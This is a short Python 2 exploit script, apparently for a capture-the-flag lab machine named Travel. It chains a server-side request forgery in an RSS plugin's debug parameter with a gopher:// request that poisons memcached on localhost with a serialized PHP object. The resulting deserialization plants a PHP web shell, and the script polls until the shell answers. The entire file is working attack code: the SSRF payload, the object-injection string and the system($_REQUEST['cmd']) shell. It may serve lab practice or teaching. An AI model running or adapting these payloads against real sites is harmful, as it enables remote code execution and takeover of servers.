import requests
import urllib

#LHOST="10.10.16.21"
file = "test.php"
url = "http://blog.travel.htb/"
def payload ():
    code = 'O:14:"TemplateHelper":2:{s:4:"file";s:'+str(len(file))+':"'+file+'";s:4:"data";s:31:"<?php system($_REQUEST["cmd"]);";}'
    #md5(md5("http://www.travel.htb/newsfeed/customfeed.xml"):"spc") = 4e5612ba079c530a6b1f148c0b352241
    payload = "%0d%0aset xct_4e5612ba079c530a6b1f148c0b352241 4 0 " + str(len(code)) + "%0d%0a" +  code + "%0d%0a"
    encodedpayload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
    return "gopher://127.00.0.1:11211/_" + encodedpayload

payload = payload()
print "[+]payload is=:  " + payload
print "[+] Requesting using ssrf in phpmemcache"

ssrf_url = url+"awesome-rss/?debug=yes&custom_feed_url="+payload
print ssrf_url
r = requests.get(ssrf_url)

print "[+] Its time for deserialization"
r = requests.get(url+"awesome-rss/")
payload_url = url + "wp-content/themes/twentytwenty/logs/"+file
print payload_url
while True:
    print payload_url
    r = requests.get(payload_url)
    if r.status_code == 200:
        break;

print "[+] You are ready to go"
print "[+] Run commands on web shell now"
